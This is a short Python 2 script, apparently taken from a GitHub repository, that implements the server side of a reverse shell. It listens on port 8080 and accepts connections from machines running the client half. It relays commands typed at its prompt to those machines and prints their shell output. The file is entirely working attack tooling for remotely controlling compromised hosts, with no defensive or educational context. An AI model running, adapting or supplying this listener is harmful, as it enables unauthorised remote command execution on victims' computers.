#!/usr/bin/env python
#
# Python Reverse Shell - Server
# from https://github.com/MisterDaneel/
#
# Copyright (C) {2016}  {MisterDaneel}
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
import socket
import time

host = '0.0.0.0'
port = 8080

def NewSocket():
    try:
        s = socket.socket()
    except socket.error as msg:
        print "[*] Socket error: " + str(msg)
    try:
        s.bind((host, port))
        s.listen(5)
        return s
    except socket.error as msg:
        print "[*] Socket binding error: " + str(msg)

def AcceptConnection(s):
    while True:
        if s:
            print "[*] Listening on [" + host + "] (port " + str(port) + ")."
            conn, addr = s.accept()
            print "[*] Connection from [" + addr[0] + "] port " + str(port) + " [tcp/*] accepted (sport " + str(addr[1]) + ")."
            SndCmds(conn)
        else: break

def SndCmds(conn):
    try:
        while True:
            # wait for data
            recv_len = 1
            response = ''
            while recv_len and not response[-1:] == '>':
                data = conn.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len == 0:
                    break
            print response
            # wait for more input
            buffer = raw_input('>')
            buffer += '\n'
            conn.send(buffer)
            time.sleep(.1)
    except:
        print '[*] Exception. Exiting.'
        conn.close()

if __name__ == "__main__":
    AcceptConnection(NewSocket())
